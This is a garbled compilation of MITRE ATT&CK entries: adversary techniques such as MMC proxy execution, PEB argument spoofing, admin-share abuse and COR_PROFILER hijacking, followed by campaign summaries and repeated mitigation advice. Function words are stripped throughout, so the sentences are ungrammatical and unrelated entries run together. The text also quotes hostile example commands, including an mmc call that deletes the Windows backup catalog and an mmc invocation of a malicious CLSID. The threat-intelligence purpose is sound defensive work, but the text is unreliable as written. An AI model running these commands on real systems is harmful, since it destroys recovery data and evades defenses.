Downgrading image versions adversary evade defenses enabling behaviors [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading image own, conjunction [Patch Image](https://attack.mitre.org/techniques/T1601/001).   Adversaries abuse credentials local account gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion. Local accounts configured organization users, remote support, services, administration single service.

Local Accounts abused elevate privileges harvest credentials [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse abuse local accounts set machines network purposes Privilege Escalation Lateral Movement.  Adversaries exploit application vulnerability bypass security features. Exploitation software vulnerability occurs adversary takes advantage programming error program, service, operating software kernel execute adversary-controlled code. Vulnerabilities exist defensive security software disable circumvent them.

Adversaries prior knowledge reconnaissance security software exists environment perform checks shortly compromised [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). security software targeted exploitation. examples antivirus software targeted persistent threat avoid detection. Adversaries advantage trusted developer utilities proxy execution malicious payloads. utilities software development tasks execute code forms assist development, debugging, reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) utilities signed legitimate certificates execute proxy execution malicious code trusted process effectively bypasses application control solutions. Adversaries shutdown/reboot systems interrupt access to, aid destruction of, systems. Operating systems commands initiate shutdown/reboot machine network device. cases, commands initiate shutdown/reboot remote network device [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Shutdown Oct 2017)(Citation: alert_TA18_106A) Shutting rebooting systems disrupt access resources legitimate users.

Adversaries attempt shutdown/reboot impacting ways, [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) [Inhibit Recovery](https://attack.mitre.org/techniques/T1490), hasten intended effects availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018) Adversaries abuse mmc.exe proxy execution malicious .msc files. Management Console (MMC) binary signed GUI command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC create, open, save custom consoles administrative tools created Microsoft, called snap-ins. snap-ins manage Windows systems locally remotely. MMC created .msc files manage configuration.(Citation: win_msc_files_overview)

For example, <code>mmc C:\Users\foo\admintools.msc /a</code> custom, saved console msc file author mode.(Citation: win_mmc) common <code>mmc gpedit.msc</code>, Policy Editor application window. 

Adversaries MMC commands perform malicious tasks. example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes backup catalog [Inhibit Recovery](https://attack.mitre.org/techniques/T1490)) prompts user (Note: <code>wbadmin.msc</code> default Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)

Adversaries abuse MMC execute malicious .msc files. example, adversaries create malicious registry Class Identifier (CLSID) subkey, uniquely identifies [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries create custom consoles “Link Address” snap-in linked malicious CLSID subkey.(Citation: mmc_vulns) .msc file saved, adversaries invoke malicious CLSID payload command: <code>mmc.exe -Embedding C:\path\to\test.msc</code>.(Citation: abusing_com_reg) Adversaries attempt hide process command-line arguments overwriting process memory. Process command-line arguments stored process environment block (PEB), data structure Windows store about/used process. PEB includes process command-line arguments referenced executing process. process created, defensive tools/sensors monitor process creations retrieve process arguments PEB.(Citation: PEB 2021)(Citation: Xpn Argue Cobalt 2019)

Adversaries manipulate process PEB evade defenses. example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) abused spawn process suspended benign arguments. process spawned PEB initialized (and process logged tools/sensors), adversaries override PEB modify command-line arguments (ex: [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) resume process execution malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Cobalt 2019)(Citation: Nviso Spoof Command 2020)

Adversaries execute process malicious command-line arguments patch memory benign arguments bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)

This behavior combined tricks (such [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) manipulate evade process-based detections. Windows systems hidden network shares accessible administrators provide ability remote file administrative functions. network shares include <code>C$</code>, <code>ADMIN$</code>, <code>IPC$</code>. 

Adversaries technique conjunction administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) remotely access networked server message block (SMB) (Citation: Wikipedia SMB) interact systems remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, transferred binaries remote Execution. execution techniques rely authenticated sessions SMB/RPC [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1035), [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries NTLM hashes access administrator shares systems [Pass Hash](https://attack.mitre.org/techniques/T1075) configuration patch levels. (Citation: Admin Shares)

The [Net](https://attack.mitre.org/software/S0039) utility connect Windows admin shares remote systems <code>net use</code> commands valid credentials. (Citation: Technet Use) Adversaries leverage COR_PROFILER environment variable hijack execution flow programs load .NET CLR. COR_PROFILER .NET Framework feature developers unmanaged (or external .NET) profiling DLL loaded .NET process loads Common Language Runtime (CLR). profilers designed monitor, troubleshoot, debug managed code executed .NET CLR.(Citation: Profiling Mar 2017)(Citation: COR_PROFILER Feb 2013)

The COR_PROFILER environment variable set scopes (system, user, process) levels influence. user-wide environment variable scopes Registry, [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object registered profiler DLL. process scope COR_PROFILER created in-memory modifying Registry. Starting .NET Framework 4, profiling DLL registered location DLL COR_PROFILER_PATH environment variable.(Citation: COR_PROFILER Feb 2013)

Adversaries abuse COR_PROFILER establish persistence executes malicious DLL context .NET processes time CLR invoked. COR_PROFILER elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) victim .NET process executes permission level, hook [Impair Defenses](https://attack.mitre.org/techniques/T1562) .NET processes.(Citation: RedCanary Mockingbird 2020)(Citation: Red Canary COR_PROFILER 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers 2017) [Frankenstein](https://attack.mitre.org/campaigns/C0001) security researchers highly-targeted campaign conducted moderately sophisticated highly resourceful threat actors 2019. unidentified actors relied source tools, including [Empire](https://attack.mitre.org/software/S0363). campaign refers actors' ability piece unrelated open-source tool components.(Citation: Talos Frankenstein June 2019) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013) global cyber espionage campaign targeted nuclear, defense, government, energy, financial companies, located Germany, Turkey, United Kingdom, United States. Security researchers campaign shared similarities previous [Lazarus Group](https://attack.mitre.org/groups/G0032) operations, including fake job recruitment lures shared malware code.(Citation: McAfee Sharpshooter December 2018)(Citation: Bleeping Op Sharpshooter March 2019)(Citation: Threatpost Op Sharpshooter Data March 2019)     [Operation Honeybee](https://attack.mitre.org/campaigns/C0006) campaign targeted humanitarian aid inter-Korean affairs organizations late 2017 2018. [Operation Honeybee](https://attack.mitre.org/campaigns/C0006) initially targeted South Korea, expanded include Vietnam, Singapore, Japan, Indonesia, Argentina, Canada. Security researchers assessed threat actors Korean speakers based metadata lure documents executables, named campaign "Honeybee" author discovered malicious Word documents.(Citation: McAfee Honeybee)  [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) long-standing persistent cyber espionage campaign targeted multiple industries Japan, South Korea, United States, Europe, Southeast Asian countries. 2015, [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors shifted government defense-related intelligence targets Japanese companies Japanese subdivisions larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil natural gas, finance, transportation, construction.(Citation: Cylance Dust Storm)

[Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors Android backdoors operations 2015, identified victims time residing Japan South Korea.(Citation: Cylance Dust Storm) [Operation Spalax](https://attack.mitre.org/campaigns/C0005) campaign targeted Colombian government organizations private companies, energy metallurgical industries. [Operation Spalax](https://attack.mitre.org/campaigns/C0005) threat actors distributed commodity malware tools generic phishing topics COVID-19, banking, law enforcement action. Security researchers indicators compromise infrastructure overlaps campaigns dating April 2018, including separately attributed [APT-C-36](https://attack.mitre.org/groups/G0099), identified differences report separate, unattributed activity.(Citation: ESET Operation Spalax Jan 2021)   [C0015](https://attack.mitre.org/campaigns/C0015) ransomware intrusion unidentified attackers [Bazar](https://attack.mitre.org/software/S0534), [Cobalt Strike](https://attack.mitre.org/software/S0154), [Conti](https://attack.mitre.org/software/S0575), tools, 5 day period. Security researchers assessed actors widely-circulated [Conti](https://attack.mitre.org/software/S0575) ransomware playbook based observed pattern activity operator errors.(Citation: DFIR Conti Bazar Nov 2021) [FunnyDream](https://attack.mitre.org/campaigns/C0007) suspected Chinese cyber espionage campaign targeted government foreign organizations Malaysia, Philippines, Taiwan, Vietnam, Southeast Asia. Security researchers linked [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign Chinese-speaking threat actors [Chinoxy](https://attack.mitre.org/software/S1041) backdoor infrastructure overlap TAG-16 threat group.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: Kaspersky APT Trends Q1 2020)(Citation: Recorded Future Chinese Activity Southeast Asia December 2021) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012) cyber espionage campaign targeting technology manufacturing companies East Asia, Western Europe, North America 2019. Security researchers goal [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), ongoing 2022, theft proprietary information, development documents, source code, blueprints technologies. Researchers assessed [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012) conducted actors affiliated [Winnti Group](https://attack.mitre.org/groups/G0044), [APT41](https://attack.mitre.org/groups/G0096), BARIUM.(Citation: Cybereason OperationCuckooBees 2022) [C0010](https://attack.mitre.org/campaigns/C0010) cyber espionage campaign conducted UNC3890 targeted Israeli shipping, government, aviation, energy, healthcare organizations. Security researcher assess UNC3890 conducts operations support Iranian interests, limited technical connections Iran, including PDB strings Farsi language artifacts. [C0010](https://attack.mitre.org/campaigns/C0010) late 2020, ongoing mid-2022.(Citation: Mandiant UNC3890 Aug 2022) [Night Dragon](https://attack.mitre.org/campaigns/C0002) cyber espionage campaign targeted oil, energy, petrochemical companies, individuals executives Kazakhstan, Taiwan, Greece, United States. unidentified threat actors searched oil gas field production systems, financials, collected data SCADA systems. Based observed techniques, tools, network activities, security researchers assessed campaign involved threat based China.(Citation: McAfee Night Dragon) [Operation Wocao](https://attack.mitre.org/campaigns/C0014) cyber espionage campaign targeted organizations world, including Brazil, China, France, Germany, Italy, Mexico, Portugal, Spain, United Kingdom, United States. suspected China-based actors compromised government organizations managed service providers, aviation, construction, energy, finance, health care, insurance, offshore engineering, software development, transportation companies.(Citation: FoxIT Wocao December 2019)

Security researchers assessed [Operation Wocao](https://attack.mitre.org/campaigns/C0014) actors TTPs tools APT20, suggesting overlap. [Operation Wocao](https://attack.mitre.org/campaigns/C0014) named observed command entry threat actors, frustration losing webshell access.(Citation: FoxIT Wocao December 2019) [C0011](https://attack.mitre.org/campaigns/C0011) suspected cyber espionage campaign conducted [Transparent Tribe](https://attack.mitre.org/groups/G0134) targeted students universities colleges India. Security researchers campaign students shift [Transparent Tribe](https://attack.mitre.org/groups/G0134)'s historic targeting Indian government, military, tank personnel, assessed ongoing July 2022.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)  [CostaRicto](https://attack.mitre.org/campaigns/C0004) suspected hacker-for-hire cyber espionage campaign targeted multiple industries worldwide, financial institutions. [CostaRicto](https://attack.mitre.org/campaigns/C0004) actors targeted organizations Europe, Americas, Asia, Australia, Africa, concentration South Asia (especially India, Bangladesh, Singapore), custom malware, source tools, complex network proxies SSH tunnels.(Citation: BlackBerry CostaRicto November 2020) Ensure valid password filters registered. Filter DLLs Windows installation directory (<code>C:\Windows\System32\</code> default) domain controller local entry <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>. (Citation: Install Password Filter n.d) Prevent files trailing space extension. Prevent users changing <code>HISTCONTROL</code> environment variable (Citation: Securing bash history). Also, <code>HISTCONTROL</code> environment variable set “ignoredup” “ignoreboth” “ignorespace”. Establish organizational policy prohibits password storage files. Ensure developers administrators aware risk plaintext passwords software configuration files left endpoint systems servers. Preemptively search files passwords remove found. Restrict file shares specific directories access users. Remove vulnerable Policy Preferences. (Citation: MS14-025) Update software regularly employing patch management internal enterprise endpoints servers. Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing, available. types virtualization application microsegmentation mitigate impact types exploitation. risks additional exploits weaknesses implementation exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software targeted defense evasion. Identify unnecessary utilities malicious software acquire Registry, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Restrict users create login items. Additionally, holding shift key login prevents apps automatically (Citation: Re-Open windows Mac). Applications vulnerabilities escapes setuid setgid bits set reduce potential damage application compromised. Additionally, programs setuid setgid bits set minimized system. blocking download/transfer execution uncommon file types adversary campaigns, CHM files. (Citation: PaloAlto Preventing Opportunistic Attacks Apr 2016) application whitelisting prevent execution hh.exe required network prevent potential misuse adversaries. implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery.

Identify malicious software audit block whitelisting(Citation: Beechey 2010) tools, AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker) Software Restriction Policies(Citation: Corio 2008) appropriate.(Citation: TechNet Applocker SRP) Disabling WMI services instability evaluated assess impact network. default, administrators allowed connect remotely WMI; restrict users allowed connect, disallow users connecting remotely WMI. Prevent credential overlap systems administrator privileged accounts. (Citation: FireEye WMI 2015) auditing tools capable detecting file permissions abuse opportunities systems enterprise correct them. Limit privileges user accounts authorized administrators interact service service binary target path locations. Toolkits PowerSploit framework PowerUp modules explore systems service file permissions weaknesses. (Citation: Powersploit)

Identify block malicious software executed abuse file, directory, service permissions whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown programs. Deny execution user directories file download directories temp directories able. (Citation: Seclists Kanthak 7zip Installer)

Turn UAC's privilege elevation standard users <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]</code>to automatically deny elevation requests, add: <code>"ConsentPromptBehaviorUser"=dword:00000000</code> (Citation: Seclists Kanthak 7zip Installer). enabling installer detection users adding: <code>"EnableInstallerDetection"=dword:00000001</code>. prompt password installation log attempt. disable installer detection, add: <code>"EnableInstallerDetection"=dword:00000000</code>. prevent potential elevation privileges exploitation process UAC detecting installer, installation process continue logged. Upgrade Windows 8 enable secure boot.

Identify block malicious software executed AppInit DLLs whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown DLLs. Restrict user's abilities create Launch Agents policy. intrusion detection signatures block traffic network boundaries. Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature block regsvr32.exe bypass whitelisting. (Citation: Secure Host Baseline EMET) domain joined, policy restrict ability create hide users. Similarly, preventing modification <code>/Library/Preferences/com.apple.loginwindow</code> <code>Hide500Users</code> force users visible. mitigate adversary access repositories collection:

* Develop publish policies define acceptable stored
* implementation access control mechanisms include authentication authorization
* Enforce principle least-privilege
* Periodic privilege review accounts
* Mitigate access [Valid Accounts](https://attack.mitre.org/techniques/T1078) access repositories Segment networks systems appropriately reduce access critical systems services controlled methods. Minimize services necessary. Regularly scan internal network services identify vulnerable services. Minimize permissions access service accounts limit impact exploitation.

Update software regularly employing patch management internal enterprise endpoints servers. Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing, available. types virtualization application microsegmentation mitigate impact types exploitation. risks additional exploits weaknesses implementation exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software services targeted. Vulnerability scanning exploitable software vulnerabilities remediate them. Map trusts existing domains/forests trust relationships minimum. Employ network segmentation sensitive domains.(Citation: Harmj0y Domain Trusts) Evaluate security third-party software enterprise environment. Ensure access management systems third-party systems limited, monitored, secure. strict approval policy third-party systems.

Grant access Third-party systems limited authorized administrators. Ensure proper access isolation critical network systems firewalls, account privilege separation, policy, multi-factor authentication. Verify account credentials access third-party systems unique enterprise network. Ensure accounts third-party providers access systems traceable third-party network third-party providers environment. Ensure third-party systems regularly patched users provider prevent potential remote access [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068). 

Ensure regular reviews accounts provisioned systems verify continued business need, ensure governance trace de-provisioning access required.

Where third-party deployment services, ensure configured deploy signed binaries, ensure trusted signing certificates co-located third-party located accessed remotely remote access tightly controlled. Identify malicious software executed padded obfuscated binary, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Mitigating technique difficult requires fine-grained API control. Efforts focused preventing unwanted unknown code executing system.

Identify block malicious software record audio whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify unnecessary utilities malicious software acquire users, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify unnecessary utilities malicious software acquire peripheral devices, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) blocking software based clipboard capture behavior, identify malicious software functionality, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) tools supplement Gatekeeper's functionality. Additionally, settings prevent applications running downloaded Apple Store mitigate issues. Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool command control signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) File activity common operating system, mitigation technique. example, mitigating accesses browser bookmark files unintended effects preventing legitimate software operating properly. Efforts focused preventing adversary tools running earlier chain activity identification subsequent malicious behavior. beneficial identify block unnecessary utilities malicious software whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify block malicious software persist manner whitelisting (Citation: Beechey 2010) tools capable monitoring DLL loads processes running permissions. Prevent access file shares, remote access systems, unnecessary services. Mechanisms limit access include network concentrators, RDP gateways, etc. Require AppleScript signed trusted developer executed - prevent random AppleScript code executing  (Citation: applescript signing). subjects AppleScript code scrutiny .app files passing Gatekeeper. Identify block malicious software abusive functionality whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP). mechanisms disable limit user access Windows utilities file types/locations invoke malicious execution.(Citation: SpectorOPs SettingContent-ms Jun 2018) Identify unnecessary utilities malicious software acquire network share information, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) remote security log sensitive file storage access controlled prevent exposure intrusion detection log data sensitive information. network appliances filter ingress egress traffic perform protocol-based filtering. Configure software endpoints filter network traffic. Restrict websites, block downloads/attachments, block Javascript, restrict browser extensions, etc. Public Key Pinning (HPKP) method mitigate potential man-in-the-middle situations adversary mis-issued fraudulent certificate intercept encrypted communications enforcing expected certificate. (Citation: Wikipedia HPKP)

Windows Policy manage root certificates <code>Flags</code> <code>HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\ProtectedRoots</code> set 1 prevent non-administrator users root installations HKCU certificate store. (Citation: SpectorOps Code Signing Dec 2017) Block users installing unapproved software. sudoers file strictly edited passwords required users can’t spawn risky processes users privilege. requiring password, adversary terminal access, password sudoers file. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. encryption protocols typical network-based C2 detection difficult reduced ability signature traffic. Prior knowledge adversary C2 infrastructure domain IP address blocking, effective long-term solution adversaries change infrastructure often. (Citation: University Birmingham C2) Identify critical business processes targeted adversaries secure communications processes tampering. Encrypt data flows reduce impact tailored modifications data transit. Identify unnecessary utilities, scripts, malicious software transfer data network, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify unnecessary utilities malicious software acquire information, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) mitigation describes guidance training developers applications avoid introducing security weaknesses adversary advantage of. Prevent adversary access privileged accounts access perform technique. Check integrity existing BIOS EFI determine vulnerable modification. Patch BIOS EFI necessary. Trusted Platform Module technology. (Citation: TCG Trusted Platform Module) Identify unnecessary utilities, third-party tools, malicious software compress files, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP)

If network intrusion prevention data loss prevention tools set block specific file types leaving network unencrypted channels, adversary encrypted channel. Block users installing unapproved hardware systems, including USB devices. Train users aware access manipulation attempts adversary reduce risk successful spearphishing, social engineering, techniques involve user interaction. Identify unnecessary utilities, third-party tools, malicious software encrypt files, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) File activity common operating system, mitigation technique. beneficial identify block unnecessary utilities malicious software whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Configure Windows User Account Control mitigate risk adversaries obtaining elevated process access. Prevent adversary access privileged accounts install hypervisor. Prevent plist files modified users read-only. configuration operating common feature operating result hardening techniques. reuse local administrator account passwords systems. Ensure password complexity uniqueness passwords cracked guessed. Deny remote local admin credentials log systems. domain user accounts local Administrators multiple systems.

Identify unnecessary utilities malicious software leverage SMB Windows admin shares, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Limit privileges user accounts authorized administrators perform Winlogon helper changes.

Identify block malicious software executed Winlogon helper process whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown DLLs. Identify critical business processes targeted adversaries secure systems tampering. Prevent critical business processes replaced, overwritten, reconfigured load malicious code. Identify malicious software audit block whitelisting(Citation: Beechey 2010) tools, AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker) Software Restriction Policies(Citation: Corio 2008) appropriate.(Citation: TechNet Applocker SRP) type attack technique easily mitigated preventive controls based abuse operating design features. example, mitigating IFEO unintended effects, preventing legitimate software (i.e., security products) operating properly. (Citation: IFEOorMalware July 2015) Efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior.

Identify block malicious software executed IFEO whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown executables. type attack technique easily mitigated preventive controls patched based abuse operating design features. example, mitigating specific API calls unintended effects, preventing legitimate process-loading mechanisms operating properly. Efforts focused preventing adversary tools running earlier chain activity identifying subsequent malicious behavior.

Although Process Doppelgänging evade types defenses, practice identify malicious software perform adversarial actions audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Identify unnecessary utilities, third-party tools, malicious software delete files, audit block whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Update software regularly employing patch management internal enterprise endpoints servers. Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing, available. types virtualization application microsegmentation mitigate impact types exploitation. risks additional exploits weaknesses implementation exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications behavior exploitation Windows Defender Exploit Guard (WDEG) Enhanced Mitigation Experience Toolkit (EMET) mitigate exploitation behavior. (Citation: TechNet Moving EMET) Control flow integrity checking identify software exploit occurring. (Citation: Wikipedia Control Flow Integrity) protections depend architecture target application binary compatibility software targeted defense evasion. encryption layer security sensitive email. Encryption public key cryptography requires adversary private certificate encryption key decrypt messages.

Use two-factor authentication public-facing webmail servers recommended practice minimize user names passwords adversaries.

Identify unnecessary utilities malicious software collect email data files access corporate email server, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Ensure proper process, registry, file permissions prevent adversaries disabling interfering security services. Identify unnecessary utilities malicious software collect data removable media, audit block whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) Properly configure firewalls proxies limit outgoing traffic ports proper network gateway systems. ensure hosts provisioned communicate authorized interfaces.

Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific obfuscation technique adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) type attack technique easily mitigated preventive controls based abuse operating design features. example, mitigating specific Windows API calls execution file extensions unintended effects, preventing legitimate software (i.e., drivers configuration tools) operating properly. Efforts focused preventing adversary tools running earlier chain activity identification subsequent malicious behavior.

Restrict storage execution Control Panel items protected directories, <code>C:\Windows</code>, user directories.

Index safe Control Panel items block malicious software whitelisting (Citation: Beechey 2010) tools AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) capable auditing blocking unknown executable files.

Consider enabling User Account Control (UAC) impede system-wide illegitimate administrators. (Citation: UAC) Monitor domains unusual credential logons. Limit credential overlap systems prevent damage credential compromise. Ensure local administrator accounts complex, unique passwords. user local administrator multiple systems. Limit domain admin account permissions domain controllers limited servers. Delegate admin functions separate accounts. (Citation: ADSecurity Kerberos Attacks)

For impact generated golden ticket, reset built-in KRBTGT account password twice, invalidate existing golden tickets created KRBTGT hash Kerberos tickets derived it. (Citation: CERT-EU Golden Ticket Protection)

Attempt identify block unknown malicious software Kerberos tickets authenticate whitelisting (Citation: Beechey 2010) tools, AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) technique difficult mitigate domains registered used, disposed shortly after. Malware researchers reverse-engineer malware variants DGAs determine future domains malware attempt contact, time resource intensive effort.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA Brute Force) Malware increasingly incorporating seed values unique instance, determined extract future generated domains. cases, seed sample extracted DNS traffic.(Citation: Akamai DGA Mitigation) so, thousands domains generated day; impractical defenders preemptively register C2 domains cost. local DNS sinkhole prevent DGA-based command control reduced cost.

Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools. (Citation: University Birmingham C2) Preventing users deleting writing files adversaries maliciously altering <code>~/.bash_history</code> files. Additionally, environment variables readonly history preserved   (Citation: Securing bash history). Disable WinRM service. service necessary, lock critical enclaves separate WinRM infrastructure, accounts, permissions. Follow WinRM practices configuration authentication methods host firewalls restrict WinRM access communication to/from specific devices. (Citation: NSA Spotting) store data backups user systems critical servers. Ensure backup storage systems hardened separate corporate network prevent compromise. Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create Launch Daemons. Ensure proper process, registry, file permissions inhibit adversaries disabling interfering critical services. Limit privileges user accounts authorized administrators interact service service configurations. Harden systems serve critical network, business, communications functions. Operate intrusion detection, analysis, response systems separate network production environment lessen chances adversary interfere critical response functions. Ensure SSH key pairs 